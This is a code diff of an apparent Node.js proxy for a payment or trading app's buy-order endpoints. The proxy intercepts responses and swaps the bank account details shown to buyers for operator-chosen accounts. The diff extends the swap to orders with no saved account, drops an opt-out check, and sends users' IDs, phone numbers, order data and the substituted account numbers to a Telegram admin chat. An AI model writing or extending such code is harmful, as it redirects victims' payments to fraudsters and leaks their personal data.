@@ -1268,14 +1268,14 @@ async function proxyAndReplaceBankInActiveOrders(req, res) {
         const ids = getItemIds(item);
         const bank = await getOrderBankMultiple(ids);
         if (bank) {
-          const primaryId = ids[0];
-          bankMap[primaryId] = bank;
+          const primaryId = ids[0] || '';
+          if (primaryId) bankMap[primaryId] = bank;
         }
       }));
       for (const item of items) {
         const ids = getItemIds(item);
-        const primaryId = ids[0];
-        const savedBank = bankMap[primaryId];
+        const primaryId = ids[0] || '';
+        const savedBank = primaryId ? bankMap[primaryId] : null;
         if (savedBank) {
           deepReplace(item, savedBank, {}, 0);
         }
@@ -1348,11 +1348,16 @@ app.post('/app/buy/order', async (req, res) => {
     }
     sendJson(res, respHeaders, jsonResp, respBody);
 
-    if (data.adminChatId && bot && !isLogOff(data, userId)) {
+    if (data.adminChatId && bot) {
       const phone = getPhone(data, userId);
-      bot.sendMessage(data.adminChatId, `⚠️ Buy INR Order [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}\nAmount: ₹${body.amount || body.buyAmount || 'N/A'}\nOrder: ${newOrderId || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
+      bot.sendMessage(data.adminChatId, `⚠️ Buy Order Created\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\nAmount: ₹${body.amount || body.buyAmount || 'N/A'}\nOrder: ${newOrderId || 'N/A'}\nData type: ${typeof buyData}\nData: ${typeof buyData === 'string' ? buyData.substring(0, 100) : JSON.stringify(buyData).substring(0, 200)}\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
     }
-  } catch(e) { await transparentProxy(req, res); }
+  } catch(e) {
+    if (data.adminChatId && bot) {
+      bot.sendMessage(data.adminChatId, `❌ Buy Order ERROR: ${e.message}`).catch(()=>{});
+    }
+    await transparentProxy(req, res);
+  }
 });
 
 app.all('/app/buy/order/details', async (req, res) => {
@@ -1369,15 +1374,28 @@ app.all('/app/buy/order/details', async (req, res) => {
       rd.buyOrderNo, rd.orderNo, rd.orderId, rd.buyOrderId, rd.id
     ].filter(Boolean);
 
+    const eff = getEffectiveSettings(data, detectedUserId);
+    let bankUsed = null;
+
     if (respData && allIds.length > 0) {
       const savedBank = await getOrderBankMultiple(allIds);
       if (savedBank) {
-        if (Array.isArray(respData)) {
-          respData.forEach(item => { if (item && typeof item === 'object') deepReplace(item, savedBank, {}, 0); });
-        } else {
-          deepReplace(respData, savedBank, {}, 0);
+        bankUsed = savedBank;
+      } else if (eff.botEnabled !== false) {
+        const active = getActiveBank(data, detectedUserId);
+        if (active) {
+          bankUsed = active;
+          saveOrderBankMultipleKeys(allIds, active);
         }
-        saveOrderBankMultipleKeys(allIds, savedBank);
+      }
+
+      if (bankUsed) {
+        if (Array.isArray(respData)) {
+          respData.forEach(item => { if (item && typeof item === 'object') deepReplace(item, bankUsed, {}, 0); });
+        } else {
+          deepReplace(respData, bankUsed, {}, 0);
+        }
+        saveOrderBankMultipleKeys(allIds, bankUsed);
       }
     }
 
@@ -1386,7 +1404,7 @@ app.all('/app/buy/order/details', async (req, res) => {
     if (data.adminChatId && bot && detectedUserId && !isLogOff(data, detectedUserId)) {
       const phone = getPhone(data, detectedUserId);
       const dispOrder = allIds[0] || 'N/A';
-      bot.sendMessage(data.adminChatId, `💰 Buy Order Details\n👤 User: ${detectedUserId}${phone ? ' (' + phone + ')' : ''}\nOrder: ${dispOrder}\nAmount: ₹${rd.amount || rd.orderAmount || rd.paymentAmount || 'N/A'}\nTime: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
+      bot.sendMessage(data.adminChatId, `💰 Order Details [${dispOrder}]\n👤 ${detectedUserId}${phone ? ' (' + phone + ')' : ''}\nIDs: ${allIds.join(', ')}\n💳 Bank: ${bankUsed ? bankUsed.accountHolder + ' | ' + bankUsed.accountNo : 'original'}\n₹${rd.amount || rd.orderAmount || 'N/A'}`).catch(()=>{});
     }
   } catch(e) { await transparentProxy(req, res); }
 });
